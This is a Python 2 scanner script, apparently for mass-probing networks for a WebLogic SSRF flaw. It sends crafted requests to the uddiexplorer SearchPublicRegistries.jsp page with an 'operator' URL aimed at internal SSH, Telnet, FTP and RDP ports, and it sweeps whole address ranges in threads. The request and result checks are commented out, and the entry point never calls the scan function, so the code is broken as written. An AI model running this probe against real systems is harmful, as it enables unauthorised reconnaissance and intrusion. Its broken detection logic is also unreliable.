#!/usr/bin/env python  
# -*- coding: utf-8 -*- 

import getopt
import re
import sys
import time
import thread
import requests

def scan(ip_str):
    web_ports = ('7001',)
    test_ports = ('22','23','21','3389')

    for web_port in web_ports:
        for test_port in test_ports:
            exp_url = "http://%s:%s/uddiexplorer/SearchPublicRegistries.jsp?" %(ip_str,web_port)+"operator=http://%s:%s" %(ip_str,test_port) \
                   + "&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
            len1 = 0
            len2 = 0
            try:
                #response = requests.get(exp_url, timeout=15, verify=False)
        #SSRF判断
                #re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',response.content)
        #丢失连接.端口连接不上
                #re_sult2 = re.findall('but could not connect',response.content)
                #len1 = len(re_sult1)
                #len2 = len(re_sult2)
                len2 = 0
            except Exception,e:
                pass
            finally:
                if (len1 != 0 and len2 == 0) :
                    print ip_str + ':' + web_port + ' is Weblogic SSRF'
                    break
                else:
                    print ip_str + ':' + web_port + ' is NOT Weblogic SSRF'

def find_ip(ip_prefix):
    '''
给出当前的192.168.1 ，然后扫描整个段所有地址
    '''
    for i in range(1,256):
        ip = '%s.%s'%(ip_prefix,i)
        thread.start_new_thread(scan, (ip,))
        time.sleep(3)

def get_ip_list(ip_info):
    ip_list = []
    iptonum = lambda x:sum([256**j*int(i) for j,i in enumerate(x.split('.')[::-1])])
    numtoip = lambda x: '.'.join([str(x/(256**i)%256) for i in range(3,-1,-1)])
    if '-' in ip_info:     # example:   192.168.0.1-192.168.0.128
        ip_range = ip_info.split('-')
        ip_start = long(iptonum(ip_range[0]))
        ip_end = long(iptonum(ip_range[1]))
        ip_count = ip_end - ip_start
        if ip_count >= 0 and ip_count <= 65536:
            for ip_num in range(ip_start,ip_end+1):
                ip_list.append(numtoip(ip_num))
        else:
            print '-h wrong format'
    elif '.ini' in ip_info:    #读取IP列表文件。文件以.ini结尾 。一行内以空格分隔IP
        fp = open(ip_info,'r')
        lines = fp.readlines()
        fp.close()
        for eachline in lines:
            l_list = eachline.strip('\n').split()
            for ip in l_list:
                ip_list.extend(get_ip_list(ip))
    else:
        ip_split=ip_info.split('.')
        net = len(ip_split)
        if net == 2 or (net == 3 and ip_split[2] == ''):
            for b in range(1,255):
                for c in range(1,255):
                    ip = "%s.%s.%d.%d"%(ip_split[0],ip_split[1],b,c)
                    ip_list.append(ip)
        elif net == 3 or (net == 4 and ip_split[3] == ''):
            for c in range(1,255):
                ip = "%s.%s.%s.%d"%(ip_split[0],ip_split[1],ip_split[2],c)
                ip_list.append(ip)
        elif net == 4 :
            ip_list.append(ip_info)
        else:
            print "-h wrong format"
    return ip_list
        
if __name__ == "__main__":
    msg = '''
Usage: python scan-weblogic-ssrf.py -h IP [-m 10]
    -h 192.168.0.1 |  -h 192.168.0.1-192.168.0.128 | -h  ip_list_file.ini | -h 192.168.0 | -h 192.168.0.
    '''
    if len(sys.argv) < 3:
        print msg
        sys.exit(-1)
    try:
        options,args = getopt.getopt(sys.argv[1:],"h:m")
        ip_info = ''
        m_count = 10
        for opt,arg in options:
            if opt == '-h':
                ip_info = arg
            elif opt == '-m':
                m_count = int(arg)
        ip_list = get_ip_list(ip_info)
        print ip_list
    except Exception,e:
          print msg
